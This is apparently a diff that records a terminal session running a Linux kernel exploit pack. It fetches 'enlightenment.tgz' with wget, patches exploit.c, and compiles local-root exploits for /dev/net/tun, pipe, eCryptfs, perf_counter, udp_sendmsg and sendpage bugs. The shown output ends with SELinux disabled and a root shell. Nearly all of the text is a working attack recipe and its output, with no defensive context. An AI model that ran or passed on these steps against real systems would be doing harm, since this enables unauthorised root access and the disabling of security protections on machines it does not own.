@@ -1,0 +1,37 @@
+wget http://rbht.pp.ru/files/enlightenment.tgz
+tar xzf enlightenment.tgz
+cd enlightenment
+sed -i '/turn_\(on\|off\)_wp();/d' exploit.c
+./run_null_exploits.sh
+Compiling exp_cheddarbay.c...OK.
+Compiling exp_ingom0wnar.c...OK.
+Compiling exp_moosecox.c...OK.
+Compiling exp_paokara.c...OK.
+Compiling exp_powerglove.c...OK.
+Compiling exp_therebel.c...OK.
+Compiling exp_vmware.c...failed.
+Compiling exp_wunderbar.c...OK.
+[+] MAPPED ZERO PAGE!
+Choose your exploit:
+[0] Cheddar Bay: Linux 2.6.30/2.6.30.1 /dev/net/tun local root
+[1] MooseCox: Linux-2.X->Linux.2.6.31.unfixed pipe local root
+[2] Paokara: Linux 2.6.19->2.6.31.1 eCryptfs local root
+[3] Powerglove: Linux 2.6.31 perf_counter local root
+[4] The Rebel: Linux < 2.6.19 udp_sendmsg() local root [5] Wunderbar Emporium: Linux 2.X sendpage() local root [6] Exit > 5
+------------------------------------------------------------------------------
+The work of an intellectual is not to mould the political will of others; it
+is, through the analyses that he does in his own field, to re-examine
+evidence and assumptions, to shake up habitual ways of working and thinking,
+to dissipate conventional familiarities, to re-evaluate rules and
+institutions and to participate in the formation of a political will (where
+he has his role as citizen to play). --Foucault
+------------------------------------------------------------------------------
+[+] Resolved security_ops to 0xffffffff8068d240
+[+] Resolved sel_read_enforce to 0xffffffff803184fb
+[+] got ring0!
+[+] detected 2.6 style 8k stacks, with current at 0xffff88000b1d5040
+[+] Disabled security of : SELinux
+[+] Got root!
+sh-3.2#
+
+http://www.grsecurity.net/~spender/enlightenment.tgz
